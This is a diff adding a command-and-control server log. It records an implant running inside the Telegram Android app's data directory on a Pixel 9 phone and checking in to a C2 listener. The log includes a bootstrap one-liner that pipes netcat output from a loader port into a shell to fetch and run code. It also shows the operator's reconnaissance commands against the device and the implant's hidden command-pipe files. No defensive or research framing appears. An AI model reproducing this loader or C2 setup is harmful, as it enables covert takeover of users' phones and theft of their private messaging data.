@@ -1,0 +1,31 @@
+[2026-11-05 18:31:30] control listening on <LAN_IP>:4444
+[2026-11-05 18:31:30] loader listening on <LAN_IP>:4445
+[2026-11-05 18:31:30] logs: <HOME>/ailocal/Telegram/telegramandroidwidget/c2/logs/run-20261105-183130
+[2026-11-05 18:31:30] downloads: <HOME>/ailocal/Telegram/telegramandroidwidget/c2/downloads
+[2026-11-05 18:31:30] bootstrap: setsid sh -c '/system/bin/sleep 2|/system/bin/toybox nc <LAN_IP> 4445|sh' &
+C2 interactive. Type 'help'.
+c2> [2026-11-05 18:32:14] loader: serving 39346 bytes to <LAN_IP>
+[2026-11-05 18:32:15] loader: serving 39346 bytes to <LAN_IP>
+[2026-11-05 18:32:15] loader: serving 39346 bytes to <LAN_IP>
+[2026-11-05 18:32:15] loader: serving 39346 bytes to <LAN_IP>
+[2026-11-05 18:32:16] loader: serving 39346 bytes to <LAN_IP>
+[2026-11-05 18:32:16] loader: serving 39346 bytes to <LAN_IP>
+[2026-11-05 18:32:16] loader: serving 39346 bytes to <LAN_IP>
+[2026-11-05 18:32:16] session 1 hello implant=tg-10290-Pixel_9 uid=10290 user=u0_a290 device=Pixel 9 pid= build=bc433d41cbc32e55 from=<LAN_IP>
+[+] session 1: tg-10290-Pixel_9 (u0_a290@Pixel 9) from <LAN_IP>
+[2026-11-05 18:32:17] loader: serving 39346 bytes to <LAN_IP>
+[2026-11-05 18:32:25] session 1 exec [tg-10290-Pixel_9]: id; getprop ro.build.version.release; getprop ro.product.model; ls -la /data/user/0/org.telegram.messenger/files/.c2 | head -8; id
+uid=10290(u0_a290) gid=10290(u0_a290) groups=10290(u0_a290),1079(ext_obb_rw),3002(net_bt),3003(inet),9997(everybody),20290(u0_a290_cache),50290(all_a290) context=u:r:untrusted_app_34:s0:c34,c257,c512,c768
+17
+Pixel 9
+total 113
+drwx------  4 u0_a290 u0_a290  3452 2026-11-05 18:32 .
+drwxrwx--x 13 u0_a290 u0_a290 24576 2026-11-05 18:32 ..
+-rw-------  1 u0_a290 u0_a290   364 2026-11-05 18:32 .cmdq
+-rw-------  1 u0_a290 u0_a290     0 2026-11-05 18:32 .e.1
+prw-------  1 u0_a290 u0_a290     0 2026-11-05 18:32 .in
+-rw-------  1 u0_a290 u0_a290   216 2026-11-05 18:32 .o.1
+prw-------  1 u0_a290 u0_a290     0 2026-11-05 18:32 .out
+uid=10290(u0_a290) gid=10290(u0_a290) groups=10290(u0_a290),1079(ext_obb_rw),3002(net_bt),3003(inet),9997(everybody),20290(u0_a290_cache),50290(all_a290) context=u:r:untrusted_app_34:s0:c34,c257,c512,c768
+[exec rc=0 1.59s]
+(s1 tg-10290-Pixel_9) > 
